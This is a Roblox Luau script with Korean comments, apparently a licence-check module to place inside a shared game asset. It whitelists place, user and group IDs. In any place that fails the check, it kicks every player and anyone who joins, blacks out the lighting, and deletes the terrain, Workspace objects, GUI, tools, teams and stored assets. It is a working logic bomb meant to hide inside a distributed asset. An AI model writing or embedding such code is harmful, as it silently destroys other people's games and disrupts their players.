-- [[ sys1-0 : Studio 환경 맞춤형 삼중 검증 엔진 ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- 1. 마스터 화이트리스트 데이터베이스
local ALLOWED_PLACES = {
	[123456789] = true, -- 허가된 Place ID
}

local ALLOWED_USERS = {
	[11223344] = true,  -- 허가된 User ID
}

local ALLOWED_GROUPS = {
	[99887766] = true,  -- 허가된 Group ID
}

-- 2. 안전한 데이터 수집 (Studio 무한 대기 우회)
local currentPlaceId = game.PlaceId
local currentCreatorId = 0
local currentCreatorType = nil

-- Studio 환경에서 정보 로딩 지연으로 스크립트가 멈추는 것을 방지
pcall(function()
	currentCreatorId = game.CreatorId
	currentCreatorType = game.CreatorType
end)

-- [체크포인트 1] 데이터 수집 시도 완료 후 data 밸류 즉시 변경
pcall(function()
	if game.ReplicatedStorage:FindFirstChild("data") then
		game.ReplicatedStorage.data.Value = true
	end
end)


-- 3. 교차 검증 검사
local isAuthorized = false

if ALLOWED_PLACES[currentPlaceId] then
	isAuthorized = true
	pcall(function() game.ReplicatedStorage.pi.Value = true end)
end

if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
	isAuthorized = true
	pcall(function() game.ReplicatedStorage.ui.Value = true end)
end

if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
	isAuthorized = true
	pcall(function() game.ReplicatedStorage.gi.Value = true end)
end


-- 4. 조건별 실행 분기
if isAuthorized then
	-- ==========================================
	-- [인증 완료] 정상 작동 구간
	-- ==========================================
	pcall(function() game.ReplicatedStorage.good.Value = true end)
	
	--------------------------------------------------
	-- 님의 핵심 작동 코드를 여기에 배치
	--------------------------------------------------
	
else
	-- ==========================================
	-- [인증 실패] 비인가 환경 제어 구간
	-- ==========================================
	
	-- [체크포인트 2] 다른 파괴 코드가 동작하기 전 ihateu 밸류를 최우선으로 변경
	pcall(function()
		if game.ReplicatedStorage:FindFirstChild("ihateu") then
			game.ReplicatedStorage.ihateu.Value = true
		end
	end)

	-- 1. 유저 즉시 강퇴 처리
	local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
	pcall(function()
		for _, player in pairs(Players:GetPlayers()) do
			player:Kick(kickMessage)
		end
	end)
	Players.PlayerAdded:Connect(function(player)
		pcall(function() player:Kick(kickMessage) end)
	end)

	-- 2. 시각 요소 테러 (조명 암전)
	pcall(function()
		game.Lighting.Brightness = 0
		game.Lighting.ClockTime = 0
		game.Lighting.GlobalShadows = true
		game.Lighting:ClearAllChildren()
		game.Lighting.FogEnd = 0
		game.Lighting.Ambient = Color3.new(0, 0, 0)
	end)

	-- 3. 지형(Terrain) 삭제
	pcall(function()
		game.Workspace.Terrain:Clear()
	end)

	-- 4. Workspace 물리 오브젝트 완전 파괴 (스크립트에 영향을 주지 않는 안전 구역)
	pcall(function()
		for _, item in pairs(game.Workspace:GetChildren()) do
			if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
				item:Destroy()
			end
		end
	end)

	-- 5. 인게임 UI 및 아이템 창고 제거
	pcall(function() game.StarterGui:ClearAllChildren() end)
	pcall(function() game.StarterPack:ClearAllChildren() end)
	pcall(function() game.Teams:ClearAllChildren() end)
	
	-- 6. ReplicatedStorage 내부 정리 (스크립트 개체 제외)
	pcall(function()
		for _, item in pairs(game.ReplicatedStorage:GetChildren()) do
			-- 메인 데이터 통로인 밸류들과 스크립트 종류는 제외하고 물리 에셋만 삭제
			if not item:IsA("LuaSourceContainer") and not item:IsA("ValueBase") then
				item:Destroy()
			end
		end
	end)
end

-- 최종 데이터 흐름 맞추기용 리턴
local SystemResult = {
	["Status"] = isAuthorized,
	["Wipe"] = function() end
}
return SystemResult
